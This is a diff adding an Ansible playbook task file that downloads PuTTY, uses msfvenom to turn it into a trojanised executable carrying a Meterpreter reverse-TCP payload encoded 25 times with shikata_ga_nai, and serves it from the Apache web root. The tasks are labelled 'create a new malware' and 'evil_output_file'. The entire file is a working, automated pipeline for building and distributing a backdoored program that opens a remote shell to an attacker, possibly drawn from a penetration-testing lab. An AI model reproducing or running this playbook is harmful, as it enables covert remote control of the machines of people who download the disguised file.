@@ -1,0 +1,23 @@
+---
+- name: download putty.exe
+  get_url:
+    url: http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+    dest: /tmp/putty.exe
+
+- name: create a new malware
+  shell: msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /tmp/putty.exe LHOST={{ lhost_ip }} LPORT={{ lhost_port }} > /tmp/{{ evil_output_file }}
+
+- name: copy {{ evil_output_file }} to /var/www/html
+  become: yes
+  become_method: sudo
+  copy:
+    src: /tmp/{{ evil_output_file }}
+    dest: /var/www/html/{{ evil_output_file }}
+    remote_src: True
+
+- name: restart apache2
+  become: yes
+  become_method: sudo
+  service: 
+    name: apache2 
+    state: restarted
